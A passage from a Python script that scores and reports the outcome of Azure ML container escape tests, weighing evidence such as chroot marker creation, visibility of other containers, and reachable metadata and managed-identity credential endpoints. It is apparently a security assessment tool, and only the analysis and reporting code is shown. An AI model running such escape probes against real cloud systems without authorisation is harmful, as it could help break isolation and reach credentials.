                            f"Could create marker in '{path}' via chroot but not directly, suggesting possible escape"
                        )
        
        # Process Azure ML specific tests
        if "azure_ml_specific" in self.results["tests"]:
            az_test = self.results["tests"]["azure_ml_specific"]
            
            # VM indicators
            if az_test.get("is_vm_indicators"):
                conclusion["azure_ml_specific_notes"].append(
                    f"Found VM indicators: {', '.join(az_test.get('is_vm_indicators'))}"
                )
                
            # Can see other containers?
            if az_test.get("can_see_other_containers") and az_test.get("other_containers"):
                conclusion["evidence_for_escape"].append(
                    f"Can see other containers: {', '.join(az_test.get('other_containers')[:3])}..."
                )
                
            # IMDS access?
            if az_test.get("imds_accessible"):
                conclusion["azure_ml_specific_notes"].append("Can access Azure Instance Metadata Service (IMDS)")
                
            # MSI access?
            if az_test.get("msi_accessible"):
                conclusion["azure_ml_specific_notes"].append("Can access Managed Service Identity (MSI) endpoint")
        
        # Process runtime drift tests
        if "runtime_drift" in self.results["tests"]:
            drift_test = self.results["tests"]["runtime_drift"]
            
            # Environment differences after escape attempts?
            if not drift_test.get("environment_differences"):
                conclusion["evidence_against_escape"].append(
                    "No environment drift observed after escape attempts, suggesting single namespace"
                )
                
            # Escape markers created?
            for marker, exists in drift_test.get("escape_markers", {}).items():
                if exists:
                    conclusion["evidence_for_escape"].append(f"Escape marker created: {marker}")
        
        # Determine overall conclusion
        evidence_for = len(conclusion["evidence_for_escape"])
        evidence_against = len(conclusion["evidence_against_escape"])
        
        if evidence_for > evidence_against:
            conclusion["appears_to_be_escaped"] = True
            conclusion["confidence"] = min(100, int((evidence_for / (evidence_for + evidence_against)) * 100))
            conclusion["likely_scenario"] = "Container escape appears successful"
        elif evidence_against > evidence_for:
            conclusion["appears_to_be_escaped"] = False
            conclusion["confidence"] = min(100, int((evidence_against / (evidence_for + evidence_against)) * 100))
            conclusion["likely_scenario"] = "Appears to be still within container boundaries"
        else:
            conclusion["appears_to_be_escaped"] = None
            conclusion["confidence"] = 50
            conclusion["likely_scenario"] = "Inconclusive evidence - could be a partial escape or shared view"
            
        # Add Azure ML specific conclusion
        if conclusion["azure_ml_specific_notes"]:
            conclusion["likely_scenario"] += f" on Azure ML: {'; '.join(conclusion['azure_ml_specific_notes'])}"
            
        self.results["conclusion"] = conclusion
        return conclusion
    
    def run_all_tests(self):
        """
        Run all tests and provide a comprehensive report.
        """
        print("\n[+] Starting Azure ML Container Escape Verification Tests")
        print("=" * 70)
        
        # Run all tests
        self.test_process_namespace()
        self.test_filesystem_namespace()
        self.test_network_namespace()
        self.test_capability_boundaries()
        self.test_cgroup_namespace()
        self.test_azure_ml_specific()
        self.test_gpu_access()
        self.test_bidirectional_marker_test()
        self.test_runtime_environment_drift()
        
        # Analyze results
        conclusion = self.analyze_results()
        
        # Print conclusion
        print("\n[+] Test Conclusion")
        print("=" * 70)
        print(f"Escape Status: {'LIKELY ESCAPED' if conclusion['appears_to_be_escaped'] else 'LIKELY CONTAINED' if conclusion['appears_to_be_escaped'] is False else 'INCONCLUSIVE'}")
        print(f"Confidence: {conclusion['confidence']}%")
        print(f"Scenario: {conclusion['likely_scenario']}")
        
        print("\n[+] Evidence For Escape:")
        for evidence in conclusion["evidence_for_escape"]:
            print(f"  - {evidence}")
            
        print("\n[+] Evidence Against Escape:")
        for evidence in conclusion["evidence_against_escape"]:
            print(f"  - {evidence}")
            
        return self.results
        
    def save_results(self, output_file=None):
        """
        Save results to a JSON file.
        """
        if output_file is None:
            output_file = f"container_escape_results_{socket.gethostname()}_{self.run_id}.json"
            
        with open(output_file, "w") as f:
            json.dump(self.results, f, indent=2)
            
        print(f"\n[+] Results saved to {output_file}")
        return output_file


if __name__ == "__main__":
    verifier = ContainerEscapeVerifier()
    results = verifier.run_all_tests()
    verifier.save_results()
